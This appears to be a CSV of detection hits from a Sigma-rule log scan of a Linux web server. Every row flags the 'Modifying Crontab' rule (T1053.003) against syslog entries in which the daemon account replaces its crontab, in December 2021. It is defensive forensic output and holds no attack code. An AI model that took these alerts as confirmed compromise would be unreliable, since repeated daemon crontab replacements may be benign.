rule,severity,level,table,count,first_utc,last_utc,timestamp_utc,mitre,matched_row,description,rule_id,rule_file
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:56,T1053.003,timestamp_utc=2021-12-08 15:58:56; timestamp=Dec  8 15:58:56; host=ApacheWebServer; process=crontab; pid=28430; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1479,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:57,T1053.003,timestamp_utc=2021-12-08 15:58:57; timestamp=Dec  8 15:58:57; host=ApacheWebServer; process=crontab; pid=28435; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1481,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:57,T1053.003,timestamp_utc=2021-12-08 15:58:57; timestamp=Dec  8 15:58:57; host=ApacheWebServer; process=crontab; pid=28449; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1483,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:58,T1053.003,timestamp_utc=2021-12-08 15:58:58; timestamp=Dec  8 15:58:58; host=ApacheWebServer; process=crontab; pid=28456; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1485,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:58,T1053.003,timestamp_utc=2021-12-08 15:58:58; timestamp=Dec  8 15:58:58; host=ApacheWebServer; process=crontab; pid=28466; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1487,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28473; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1489,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28478; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1491,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28482; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1493,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28487; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1495,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:00,T1053.003,timestamp_utc=2021-12-08 15:59:00; timestamp=Dec  8 15:59:00; host=ApacheWebServer; process=crontab; pid=28491; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1497,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:00,T1053.003,timestamp_utc=2021-12-08 15:59:00; timestamp=Dec  8 15:59:00; host=ApacheWebServer; process=crontab; pid=28501; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1499,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:00,T1053.003,timestamp_utc=2021-12-08 15:59:00; timestamp=Dec  8 15:59:00; host=ApacheWebServer; process=crontab; pid=28507; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1501,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:01,T1053.003,timestamp_utc=2021-12-08 15:59:01; timestamp=Dec  8 15:59:01; host=ApacheWebServer; process=crontab; pid=28515; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1503,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:01,T1053.003,timestamp_utc=2021-12-08 15:59:01; timestamp=Dec  8 15:59:01; host=ApacheWebServer; process=crontab; pid=28521; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1505,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:01,T1053.003,timestamp_utc=2021-12-08 15:59:01; timestamp=Dec  8 15:59:01; host=ApacheWebServer; process=crontab; pid=28528; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1507,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:02,T1053.003,timestamp_utc=2021-12-08 15:59:02; timestamp=Dec  8 15:59:02; host=ApacheWebServer; process=crontab; pid=28532; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1510,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:02,T1053.003,timestamp_utc=2021-12-08 15:59:02; timestamp=Dec  8 15:59:02; host=ApacheWebServer; process=crontab; pid=28544; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1512,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:02,T1053.003,timestamp_utc=2021-12-08 15:59:02; timestamp=Dec  8 15:59:02; host=ApacheWebServer; process=crontab; pid=28547; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1514,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:03,T1053.003,timestamp_utc=2021-12-08 15:59:03; timestamp=Dec  8 15:59:03; host=ApacheWebServer; process=crontab; pid=28553; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1516,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:03,T1053.003,timestamp_utc=2021-12-08 15:59:03; timestamp=Dec  8 15:59:03; host=ApacheWebServer; process=crontab; pid=28559; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1518,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:04,T1053.003,timestamp_utc=2021-12-08 15:59:04; timestamp=Dec  8 15:59:04; host=ApacheWebServer; process=crontab; pid=28568; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1520,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:05,T1053.003,timestamp_utc=2021-12-08 15:59:05; timestamp=Dec  8 15:59:05; host=ApacheWebServer; process=crontab; pid=28584; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1522,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:05,T1053.003,timestamp_utc=2021-12-08 15:59:05; timestamp=Dec  8 15:59:05; host=ApacheWebServer; process=crontab; pid=28594; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1524,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:05,T1053.003,timestamp_utc=2021-12-08 15:59:05; timestamp=Dec  8 15:59:05; host=ApacheWebServer; process=crontab; pid=28598; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1526,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28603; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1528,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28608; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1530,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28612; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1532,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:06,T1053.003,timestamp_utc=2021-12-08 15:59:06; timestamp=Dec  8 15:59:06; host=ApacheWebServer; process=crontab; pid=28619; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1534,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:07,T1053.003,timestamp_utc=2021-12-08 15:59:07; timestamp=Dec  8 15:59:07; host=ApacheWebServer; process=crontab; pid=28629; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1536,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:07,T1053.003,timestamp_utc=2021-12-08 15:59:07; timestamp=Dec  8 15:59:07; host=ApacheWebServer; process=crontab; pid=28642; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1538,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:08,T1053.003,timestamp_utc=2021-12-08 15:59:08; timestamp=Dec  8 15:59:08; host=ApacheWebServer; process=crontab; pid=28649; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1540,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:08,T1053.003,timestamp_utc=2021-12-08 15:59:08; timestamp=Dec  8 15:59:08; host=ApacheWebServer; process=crontab; pid=28656; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1542,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:08,T1053.003,timestamp_utc=2021-12-08 15:59:08; timestamp=Dec  8 15:59:08; host=ApacheWebServer; process=crontab; pid=28661; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1544,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28667; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1546,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28670; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1548,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28674; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1550,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:09,T1053.003,timestamp_utc=2021-12-08 15:59:09; timestamp=Dec  8 15:59:09; host=ApacheWebServer; process=crontab; pid=28682; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1552,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:10,T1053.003,timestamp_utc=2021-12-08 15:59:10; timestamp=Dec  8 15:59:10; host=ApacheWebServer; process=crontab; pid=28688; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1554,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:10,T1053.003,timestamp_utc=2021-12-08 15:59:10; timestamp=Dec  8 15:59:10; host=ApacheWebServer; process=crontab; pid=28700; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1556,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:10,T1053.003,timestamp_utc=2021-12-08 15:59:10; timestamp=Dec  8 15:59:10; host=ApacheWebServer; process=crontab; pid=28706; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1558,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:11,T1053.003,timestamp_utc=2021-12-08 15:59:11; timestamp=Dec  8 15:59:11; host=ApacheWebServer; process=crontab; pid=28712; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1560,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:11,T1053.003,timestamp_utc=2021-12-08 15:59:11; timestamp=Dec  8 15:59:11; host=ApacheWebServer; process=crontab; pid=28719; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1562,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:11,T1053.003,timestamp_utc=2021-12-08 15:59:11; timestamp=Dec  8 15:59:11; host=ApacheWebServer; process=crontab; pid=28722; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1564,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28726; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1566,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28733; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1568,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28737; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1570,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:12,T1053.003,timestamp_utc=2021-12-08 15:59:12; timestamp=Dec  8 15:59:12; host=ApacheWebServer; process=crontab; pid=28747; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1572,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:13,T1053.003,timestamp_utc=2021-12-08 15:59:13; timestamp=Dec  8 15:59:13; host=ApacheWebServer; process=crontab; pid=28753; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1574,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:13,T1053.003,timestamp_utc=2021-12-08 15:59:13; timestamp=Dec  8 15:59:13; host=ApacheWebServer; process=crontab; pid=28761; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1576,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:59:14,T1053.003,timestamp_utc=2021-12-08 15:59:14; timestamp=Dec  8 15:59:14; host=ApacheWebServer; process=crontab; pid=28774; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1579,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:17,T1053.003,timestamp_utc=2021-12-07 10:06:17; timestamp=Dec  7 10:06:17; host=ApacheWebServer; process=crontab; pid=18224; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=479,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18227; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=481,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18232; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=483,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18235; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=485,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18238; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=487,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
